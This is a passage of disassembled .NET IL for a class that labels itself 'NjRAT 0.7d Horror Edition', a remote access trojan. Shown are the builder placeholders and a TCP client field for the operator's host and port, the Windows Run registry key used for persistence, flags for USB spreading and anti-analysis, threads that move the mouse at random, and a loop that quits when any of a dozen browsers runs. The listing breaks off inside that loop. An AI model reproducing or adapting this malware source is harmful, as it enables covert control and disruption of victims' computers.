    .field public static literal valuetype j.OK/SW ShowMinimized = int32(0x00000002)
    .field public static literal valuetype j.OK/SW ShowMaximized = int32(0x00000003)
    .field public static literal valuetype j.OK/SW ShowNoActivate = int32(0x00000004)
    .field public static literal valuetype j.OK/SW Show = int32(0x00000005)
    .field public static literal valuetype j.OK/SW Minimize = int32(0x00000006)
    .field public static literal valuetype j.OK/SW ShowMinNoActive = int32(0x00000007)
    .field public static literal valuetype j.OK/SW ShowNA = int32(0x00000008)
    .field public static literal valuetype j.OK/SW Restore = int32(0x00000009)
    .field public static literal valuetype j.OK/SW ShowDefault = int32(0x0000000A)
    .field public static literal valuetype j.OK/SW ForceMinimize = int32(0x0000000B)
    .field public static literal valuetype j.OK/SW Max = int32(0x0000000B)
  } // end of class SW

  .class auto ansi sealed nested private GetWindow_Cmd
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDFIRST = uint32(0x00000000)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDLAST = uint32(0x00000001)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDNEXT = uint32(0x00000002)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_HWNDPREV = uint32(0x00000003)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_OWNER = uint32(0x00000004)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_CHILD = uint32(0x00000005)
    .field public static literal valuetype j.OK/GetWindow_Cmd GW_ENABLEDPOPUP = uint32(0x00000006)
  } // end of class GetWindow_Cmd

  .class auto ansi sealed nested public TernaryRasterOperations
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCCOPY = int32(0x00CC0020)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCPAINT = int32(0x00EE0086)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCAND = int32(0x008800C6)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCINVERT = int32(0x00660046)
    .field public static literal valuetype j.OK/TernaryRasterOperations SRCERASE = int32(0x00440328)
    .field public static literal valuetype j.OK/TernaryRasterOperations NOTSRCCOPY = int32(0x00330008)
    .field public static literal valuetype j.OK/TernaryRasterOperations NOTSRCERASE = int32(0x001100A6)
    .field public static literal valuetype j.OK/TernaryRasterOperations MERGECOPY = int32(0x00C000CA)
    .field public static literal valuetype j.OK/TernaryRasterOperations MERGEPAINT = int32(0x00BB0226)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATCOPY = int32(0x00F00021)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATPAINT = int32(0x00FB0A09)
    .field public static literal valuetype j.OK/TernaryRasterOperations PATINVERT = int32(0x005A0049)
    .field public static literal valuetype j.OK/TernaryRasterOperations DSTINVERT = int32(0x00550009)
    .field public static literal valuetype j.OK/TernaryRasterOperations BLACKNESS = int32(0x00000042)
    .field public static literal valuetype j.OK/TernaryRasterOperations WHITENESS = int32(0x00FF0062)
  } // end of class TernaryRasterOperations

  .field private class [mscorlib]System.Threading.Thread MouseThread
  .field private class [mscorlib]System.Threading.Thread CrazyThread
  .field private class [mscorlib]System.Threading.Thread bThread
  .field private static literal int32 WM_COMMAND = int32(0x00000111)
  .field private static literal int32 SRCCOPY = int32(0x00CC0020)
  .field private class [mscorlib]System.Random r
  .field private static uint8[] b
  .field public static bool BD
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static bool Cn
  .field public static string DR
  .field public static string EXE
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static string H
  .field public static bool Idr
  .field public static bool Anti_CH
  .field public static bool IsF
  .field public static bool USB_SP
  .field public static bool Isu
  .field public static class j.kl kq
  .field private static string lastcap
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field public static object MT
  .field public static string P
  .field public static object PLG
  .field public static string RG
  .field public static string sf
  .field public static string VN
  .field public static string VR
  .field public static string Y
  .field public static string MSGE
  .field public static string MSGT
  .field public static string MSGB
  .field public static string MSGSYM
  .field public static string OBITO
  .field public static string TSKE
  .field public static string TSK
  .field public static string KAKASHI
  .field public static string AKATSUKI
  .field public static string CLEANSWEEP
  .field public static string PASTEE
  .field public static string PASTEBIN
  .field public static string CLIP
  .field public static string UAC
  .field public static string nowifi
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       426 (0x1aa)
    .maxstack  1
    IL_0000:  ldc.i4     0x1401
    IL_0005:  newarr     [mscorlib]System.Byte
    IL_000a:  stsfld     uint8[] j.OK::b
    IL_000f:  ldstr      "[BD]"
    IL_0014:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0019:  stsfld     bool j.OK::BD
    IL_001e:  ldnull
    IL_001f:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_0024:  ldc.i4.0
    IL_0025:  stsfld     bool j.OK::Cn
    IL_002a:  ldstr      "[DR]"
    IL_002f:  stsfld     string j.OK::DR
    IL_0034:  ldstr      "[EXE]"
    IL_0039:  stsfld     string j.OK::EXE
    IL_003e:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0043:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0048:  ldstr      "[H]"
    IL_004d:  stsfld     string j.OK::H
    IL_0052:  ldstr      "[Idr]"
    IL_0057:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_005c:  stsfld     bool j.OK::Idr
    IL_0061:  ldstr      "[Anti_CH]"
    IL_0066:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_006b:  stsfld     bool j.OK::Anti_CH
    IL_0070:  ldstr      "[Isf]"
    IL_0075:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_007a:  stsfld     bool j.OK::IsF
    IL_007f:  ldstr      "[USB_SP]"
    IL_0084:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0089:  stsfld     bool j.OK::USB_SP
    IL_008e:  ldstr      "[Isu]"
    IL_0093:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0098:  stsfld     bool j.OK::Isu
    IL_009d:  ldnull
    IL_009e:  stsfld     class j.kl j.OK::kq
    IL_00a3:  ldstr      ""
    IL_00a8:  stsfld     string j.OK::lastcap
    IL_00ad:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_00b2:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_00b7:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_00bc:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_00c1:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_00c6:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
    IL_00cb:  ldnull
    IL_00cc:  stsfld     object j.OK::MT
    IL_00d1:  ldstr      "[P]"
    IL_00d6:  stsfld     string j.OK::P
    IL_00db:  ldnull
    IL_00dc:  stsfld     object j.OK::PLG
    IL_00e1:  ldstr      "[RG]"
    IL_00e6:  stsfld     string j.OK::RG
    IL_00eb:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_00f0:  stsfld     string j.OK::sf
    IL_00f5:  ldstr      "[VN]"
    IL_00fa:  stsfld     string j.OK::VN
    IL_00ff:  ldstr      "<- NjRAT 0.7d Horror Edition ->"
    IL_0104:  stsfld     string j.OK::VR
    IL_0109:  ldstr      "Y262SUCZ4UJJ"
    IL_010e:  stsfld     string j.OK::Y
    IL_0113:  ldstr      "[MSGE]"
    IL_0118:  stsfld     string j.OK::MSGE
    IL_011d:  ldstr      "[MSGT]"
    IL_0122:  stsfld     string j.OK::MSGT
    IL_0127:  ldstr      "[MSGB]"
    IL_012c:  stsfld     string j.OK::MSGB
    IL_0131:  ldstr      "[MSGSYM]"
    IL_0136:  stsfld     string j.OK::MSGSYM
    IL_013b:  ldstr      "[OBITO]"
    IL_0140:  stsfld     string j.OK::OBITO
    IL_0145:  ldstr      "[TSKE]"
    IL_014a:  stsfld     string j.OK::TSKE
    IL_014f:  ldstr      "[TSK]"
    IL_0154:  stsfld     string j.OK::TSK
    IL_0159:  ldstr      "[KAKASHI]"
    IL_015e:  stsfld     string j.OK::KAKASHI
    IL_0163:  ldstr      "[AKATSUKI]"
    IL_0168:  stsfld     string j.OK::AKATSUKI
    IL_016d:  ldstr      "[CLEANSWEEP]"
    IL_0172:  stsfld     string j.OK::CLEANSWEEP
    IL_0177:  ldstr      "[PASTEE]"
    IL_017c:  stsfld     string j.OK::PASTEE
    IL_0181:  ldstr      "[PASTEBIN]"
    IL_0186:  stsfld     string j.OK::PASTEBIN
    IL_018b:  ldstr      "null"
    IL_0190:  stsfld     string j.OK::CLIP
    IL_0195:  ldstr      "[UAC]"
    IL_019a:  stsfld     string j.OK::UAC
    IL_019f:  ldstr      "off"
    IL_01a4:  stsfld     string j.OK::nowifi
    IL_01a9:  ret
  } // end of method OK::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       76 (0x4c)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldnull
    IL_0008:  ldftn      void j.OK::Mouse()
    IL_000e:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0013:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0018:  stfld      class [mscorlib]System.Threading.Thread j.OK::MouseThread
    IL_001d:  ldarg.0
    IL_001e:  ldnull
    IL_001f:  ldftn      void j.OK::Crazy()
    IL_0025:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_002a:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_002f:  stfld      class [mscorlib]System.Threading.Thread j.OK::CrazyThread
    IL_0034:  ldarg.0
    IL_0035:  ldnull
    IL_0036:  ldftn      void j.OK::bac()
    IL_003c:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0041:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0046:  stfld      class [mscorlib]System.Threading.Thread j.OK::bThread
    IL_004b:  ret
  } // end of method OK::.ctor

  .method private static void  _Lambda__1(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  castclass  uint8[]
    IL_0006:  call       void j.OK::Ind(uint8[])
    IL_000b:  ret
  } // end of method OK::_Lambda__1

  .method private static void  _Lambda__2(object a0,
                                          class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ED()
    IL_0005:  ret
  } // end of method OK::_Lambda__2

  .method public static string  Replace(string oldValue,
                                        string newValue) cil managed
  {
    // Code size       2 (0x2)
    .maxstack  1
    .locals init (string V_0)
    IL_0000:  ldloc.0
    IL_0001:  ret
  } // end of method OK::Replace

  .method private static void  Mouse() cil managed
  {
    // Code size       134 (0x86)
    .maxstack  4
    .locals init (class [mscorlib]System.Threading.Thread V_0,
             int32 V_1,
             int32 V_2,
             valuetype [System.Drawing]System.Drawing.Rectangle V_3,
             int32 V_4,
             int32 V_5,
             int32 V_6,
             valuetype [System.Drawing]System.Drawing.Point V_7)
    IL_0000:  ldnull
    IL_0001:  ldftn      void j.OK::Mouse()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0011:  stloc.0
    IL_0012:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_0017:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_001c:  stloc.3
    IL_001d:  ldloca.s   V_3
    IL_001f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
    IL_0024:  stloc.1
    IL_0025:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_002a:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_002f:  stloc.3
    IL_0030:  ldloca.s   V_3
    IL_0032:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
    IL_0037:  stloc.2
    IL_0038:  ldc.i4.1
    IL_0039:  stloc.s    V_4
    IL_003b:  newobj     instance void [mscorlib]System.Random::.ctor()
    IL_0040:  dup
    IL_0041:  ldc.i4.0
    IL_0042:  ldloc.2
    IL_0043:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_0048:  stloc.s    V_5
    IL_004a:  ldc.i4.0
    IL_004b:  ldloc.1
    IL_004c:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                      int32)
    IL_0051:  stloc.s    V_6
    IL_0053:  ldloca.s   V_7
    IL_0055:  ldloc.s    V_5
    IL_0057:  call       instance void [System.Drawing]System.Drawing.Point::set_X(int32)
    IL_005c:  ldloca.s   V_7
    IL_005e:  ldloc.s    V_6
    IL_0060:  call       instance void [System.Drawing]System.Drawing.Point::set_Y(int32)
    IL_0065:  ldloc.s    V_7
    IL_0067:  call       void [System.Windows.Forms]System.Windows.Forms.Cursor::set_Position(valuetype [System.Drawing]System.Drawing.Point)
    IL_006c:  ldc.i4.s   50
    IL_006e:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0073:  ldloc.s    V_4
    IL_0075:  ldc.i4.1
    IL_0076:  add.ovf
    IL_0077:  stloc.s    V_4
    IL_0079:  ldloc.s    V_4
    IL_007b:  ldc.i4.s   100
    IL_007d:  ble.s      IL_003b

    IL_007f:  ldloc.0
    IL_0080:  callvirt   instance void [mscorlib]System.Threading.Thread::Abort()
    IL_0085:  ret
  } // end of method OK::Mouse

  .method private static void  Crazy() cil managed
  {
    // Code size       108 (0x6c)
    .maxstack  2
    .locals init (class [mscorlib]System.Threading.Thread V_0,
             int32 V_1)
    IL_0000:  ldnull
    IL_0001:  ldftn      void j.OK::Crazy()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0011:  stloc.0
    IL_0012:  ldc.i4.1
    IL_0013:  stloc.1
    IL_0014:  call       string j.OK::HorrorText()
    IL_0019:  pop
    IL_001a:  call       string j.OK::HorrorText()
    IL_001f:  pop
    IL_0020:  call       string j.OK::HorrorText()
    IL_0025:  pop
    IL_0026:  call       string j.OK::HorrorText()
    IL_002b:  pop
    IL_002c:  call       string j.OK::HorrorText()
    IL_0031:  pop
    IL_0032:  call       string j.OK::HorrorText()
    IL_0037:  pop
    IL_0038:  call       string j.OK::HorrorText()
    IL_003d:  pop
    IL_003e:  call       string j.OK::HorrorText()
    IL_0043:  pop
    IL_0044:  call       string j.OK::HorrorText()
    IL_0049:  pop
    IL_004a:  call       string j.OK::HorrorText()
    IL_004f:  pop
    IL_0050:  call       string j.OK::HorrorText()
    IL_0055:  pop
    IL_0056:  call       string j.OK::HorrorText()
    IL_005b:  pop
    IL_005c:  ldloc.1
    IL_005d:  ldc.i4.1
    IL_005e:  add.ovf
    IL_005f:  stloc.1
    IL_0060:  ldloc.1
    IL_0061:  ldc.i4.s   100
    IL_0063:  ble.s      IL_0014

    IL_0065:  ldloc.0
    IL_0066:  callvirt   instance void [mscorlib]System.Threading.Thread::Abort()
    IL_006b:  ret
  } // end of method OK::Crazy

  .method private static void  bac() cil managed noinlining nooptimization
  {
    // Code size       799 (0x31f)
    .maxstack  3
    .locals init (class [mscorlib]System.Threading.Thread V_0,
             class [System]System.Diagnostics.Process[] V_1,
             int32 V_2,
             class [System]System.Diagnostics.Process[] V_3,
             int32 V_4,
             class [System]System.Diagnostics.Process[] V_5,
             int32 V_6,
             class [System]System.Diagnostics.Process[] V_7,
             int32 V_8,
             class [System]System.Diagnostics.Process[] V_9,
             int32 V_10,
             class [System]System.Diagnostics.Process[] V_11,
             int32 V_12,
             class [System]System.Diagnostics.Process[] V_13,
             int32 V_14,
             class [System]System.Diagnostics.Process[] V_15,
             int32 V_16,
             class [System]System.Diagnostics.Process[] V_17,
             int32 V_18,
             class [System]System.Diagnostics.Process[] V_19,
             int32 V_20,
             class [System]System.Diagnostics.Process[] V_21,
             int32 V_22,
             class [System]System.Diagnostics.Process[] V_23,
             int32 V_24,
             class [System]System.Diagnostics.Process[] V_25,
             int32 V_26,
             class [System]System.Diagnostics.Process[] V_27,
             int32 V_28,
             class [System]System.Diagnostics.Process[] V_29,
             int32 V_30,
             class [System]System.Diagnostics.Process[] V_31,
             int32 V_32,
             class [System]System.Diagnostics.Process[] V_33,
             int32 V_34,
             class [System]System.Diagnostics.Process[] V_35,
             int32 V_36)
    IL_0000:  ldnull
    IL_0001:  ldftn      void j.OK::bac()
    IL_0007:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_000c:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0011:  stloc.0
    IL_0012:  ldsfld     string j.OK::nowifi
    IL_0017:  ldstr      "on"
    IL_001c:  ldc.i4.0
    IL_001d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0022:  brtrue     IL_0318

    IL_0027:  ldstr      "Chrome"
    IL_002c:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0031:  stloc.1
    IL_0032:  ldc.i4.0
    IL_0033:  stloc.2
    IL_0034:  br.s       IL_0043

    IL_0036:  ldloc.1
    IL_0037:  ldloc.2
    IL_0038:  ldelem.ref
    IL_0039:  pop
    IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_003f:  ldloc.2
    IL_0040:  ldc.i4.1
    IL_0041:  add.ovf
    IL_0042:  stloc.2
    IL_0043:  ldloc.2
    IL_0044:  ldloc.1
    IL_0045:  ldlen
    IL_0046:  conv.i4
    IL_0047:  blt.s      IL_0036

    IL_0049:  ldstr      "Firefox"
    IL_004e:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0053:  stloc.3
    IL_0054:  ldc.i4.0
    IL_0055:  stloc.s    V_4
    IL_0057:  br.s       IL_0069

    IL_0059:  ldloc.3
    IL_005a:  ldloc.s    V_4
    IL_005c:  ldelem.ref
    IL_005d:  pop
    IL_005e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0063:  ldloc.s    V_4
    IL_0065:  ldc.i4.1
    IL_0066:  add.ovf
    IL_0067:  stloc.s    V_4
    IL_0069:  ldloc.s    V_4
    IL_006b:  ldloc.3
    IL_006c:  ldlen
    IL_006d:  conv.i4
    IL_006e:  blt.s      IL_0059

    IL_0070:  ldstr      "Opera"
    IL_0075:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_007a:  stloc.s    V_5
    IL_007c:  ldc.i4.0
    IL_007d:  stloc.s    V_6
    IL_007f:  br.s       IL_0092

    IL_0081:  ldloc.s    V_5
    IL_0083:  ldloc.s    V_6
    IL_0085:  ldelem.ref
    IL_0086:  pop
    IL_0087:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_008c:  ldloc.s    V_6
    IL_008e:  ldc.i4.1
    IL_008f:  add.ovf
    IL_0090:  stloc.s    V_6
    IL_0092:  ldloc.s    V_6
    IL_0094:  ldloc.s    V_5
    IL_0096:  ldlen
    IL_0097:  conv.i4
    IL_0098:  blt.s      IL_0081

    IL_009a:  ldstr      "OperaGX"
    IL_009f:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00a4:  stloc.s    V_7
    IL_00a6:  ldc.i4.0
    IL_00a7:  stloc.s    V_8
    IL_00a9:  br.s       IL_00bc

    IL_00ab:  ldloc.s    V_7
    IL_00ad:  ldloc.s    V_8
    IL_00af:  ldelem.ref
    IL_00b0:  pop
    IL_00b1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00b6:  ldloc.s    V_8
    IL_00b8:  ldc.i4.1
    IL_00b9:  add.ovf
    IL_00ba:  stloc.s    V_8
    IL_00bc:  ldloc.s    V_8
    IL_00be:  ldloc.s    V_7
    IL_00c0:  ldlen
    IL_00c1:  conv.i4
    IL_00c2:  blt.s      IL_00ab

    IL_00c4:  ldstr      "Palemoon"
    IL_00c9:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00ce:  stloc.s    V_9
    IL_00d0:  ldc.i4.0
    IL_00d1:  stloc.s    V_10
    IL_00d3:  br.s       IL_00e6

    IL_00d5:  ldloc.s    V_9
    IL_00d7:  ldloc.s    V_10
    IL_00d9:  ldelem.ref
    IL_00da:  pop
    IL_00db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00e0:  ldloc.s    V_10
    IL_00e2:  ldc.i4.1
    IL_00e3:  add.ovf
    IL_00e4:  stloc.s    V_10
    IL_00e6:  ldloc.s    V_10
    IL_00e8:  ldloc.s    V_9
    IL_00ea:  ldlen
    IL_00eb:  conv.i4
    IL_00ec:  blt.s      IL_00d5

    IL_00ee:  ldstr      "Brave"
    IL_00f3:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00f8:  stloc.s    V_11
    IL_00fa:  ldc.i4.0
    IL_00fb:  stloc.s    V_12
    IL_00fd:  br.s       IL_0110

    IL_00ff:  ldloc.s    V_11
    IL_0101:  ldloc.s    V_12
    IL_0103:  ldelem.ref
    IL_0104:  pop
    IL_0105:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_010a:  ldloc.s    V_12
    IL_010c:  ldc.i4.1
    IL_010d:  add.ovf
    IL_010e:  stloc.s    V_12
    IL_0110:  ldloc.s    V_12
    IL_0112:  ldloc.s    V_11
    IL_0114:  ldlen
    IL_0115:  conv.i4
    IL_0116:  blt.s      IL_00ff

    IL_0118:  ldstr      "Tor"
    IL_011d:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0122:  stloc.s    V_13
    IL_0124:  ldc.i4.0
    IL_0125:  stloc.s    V_14
    IL_0127:  br.s       IL_013a

    IL_0129:  ldloc.s    V_13
    IL_012b:  ldloc.s    V_14
    IL_012d:  ldelem.ref
    IL_012e:  pop
    IL_012f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0134:  ldloc.s    V_14
    IL_0136:  ldc.i4.1
    IL_0137:  add.ovf
    IL_0138:  stloc.s    V_14
    IL_013a:  ldloc.s    V_14
    IL_013c:  ldloc.s    V_13
    IL_013e:  ldlen
    IL_013f:  conv.i4
    IL_0140:  blt.s      IL_0129

    IL_0142:  ldstr      "Vivaldi"
    IL_0147:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_014c:  stloc.s    V_15
    IL_014e:  ldc.i4.0
    IL_014f:  stloc.s    V_16
    IL_0151:  br.s       IL_0164

    IL_0153:  ldloc.s    V_15
    IL_0155:  ldloc.s    V_16
    IL_0157:  ldelem.ref
    IL_0158:  pop
    IL_0159:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_015e:  ldloc.s    V_16
    IL_0160:  ldc.i4.1
    IL_0161:  add.ovf
    IL_0162:  stloc.s    V_16
    IL_0164:  ldloc.s    V_16
    IL_0166:  ldloc.s    V_15
    IL_0168:  ldlen
    IL_0169:  conv.i4
    IL_016a:  blt.s      IL_0153

    IL_016c:  ldstr      "Dissenter"
    IL_0171:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0176:  stloc.s    V_17
    IL_0178:  ldc.i4.0
    IL_0179:  stloc.s    V_18
    IL_017b:  br.s       IL_018e

    IL_017d:  ldloc.s    V_17
    IL_017f:  ldloc.s    V_18
    IL_0181:  ldelem.ref
    IL_0182:  pop
    IL_0183:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0188:  ldloc.s    V_18
    IL_018a:  ldc.i4.1
    IL_018b:  add.ovf
    IL_018c:  stloc.s    V_18
    IL_018e:  ldloc.s    V_18
    IL_0190:  ldloc.s    V_17
    IL_0192:  ldlen
    IL_0193:  conv.i4
    IL_0194:  blt.s      IL_017d

    IL_0196:  ldstr      "iExplore"
    IL_019b:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01a0:  stloc.s    V_19
    IL_01a2:  ldc.i4.0
    IL_01a3:  stloc.s    V_20
    IL_01a5:  br.s       IL_01b8

    IL_01a7:  ldloc.s    V_19
    IL_01a9:  ldloc.s    V_20
    IL_01ab:  ldelem.ref
    IL_01ac:  pop
    IL_01ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01b2:  ldloc.s    V_20
    IL_01b4:  ldc.i4.1
    IL_01b5:  add.ovf
    IL_01b6:  stloc.s    V_20
    IL_01b8:  ldloc.s    V_20
    IL_01ba:  ldloc.s    V_19
    IL_01bc:  ldlen
    IL_01bd:  conv.i4
    IL_01be:  blt.s      IL_01a7

    IL_01c0:  ldstr      "Iridium"
    IL_01c5:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01ca:  stloc.s    V_21
    IL_01cc:  ldc.i4.0
    IL_01cd:  stloc.s    V_22
    IL_01cf:  br.s       IL_01e2

    IL_01d1:  ldloc.s    V_21
    IL_01d3:  ldloc.s    V_22
    IL_01d5:  ldelem.ref
    IL_01d6:  pop
    IL_01d7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01dc:  ldloc.s    V_22
    IL_01de:  ldc.i4.1
    IL_01df:  add.ovf
    IL_01e0:  stloc.s    V_22
    IL_01e2:  ldloc.s    V_22
    IL_01e4:  ldloc.s    V_21
    IL_01e6:  ldlen
    IL_01e7:  conv.i4
    IL_01e8:  blt.s      IL_01d1

    IL_01ea:  ldstr      "Safari"
    IL_01ef:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01f4:  stloc.s    V_23
    IL_01f6:  ldc.i4.0
    IL_01f7:  stloc.s    V_24
    IL_01f9:  br.s       IL_020c

    IL_01fb:  ldloc.s    V_23
    IL_01fd:  ldloc.s    V_24
    IL_01ff:  ldelem.ref
    IL_0200:  pop
    IL_0201:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0206:  ldloc.s    V_24
    IL_0208:  ldc.i4.1
    IL_0209:  add.ovf
    IL_020a:  stloc.s    V_24
    IL_020c:  ldloc.s    V_24
    IL_020e:  ldloc.s    V_23
    IL_0210:  ldlen
    IL_0211:  conv.i4
    IL_0212:  blt.s      IL_01fb

    IL_0214:  ldstr      "MsEdge"
    IL_0219:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_021e:  stloc.s    V_25
    IL_0220:  ldc.i4.0
    IL_0221:  stloc.s    V_26
    IL_0223:  br.s       IL_0236

    IL_0225:  ldloc.s    V_25
    IL_0227:  ldloc.s    V_26
    IL_0229:  ldelem.ref
    IL_022a:  pop
    IL_022b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0230:  ldloc.s    V_26
    IL_0232:  ldc.i4.1
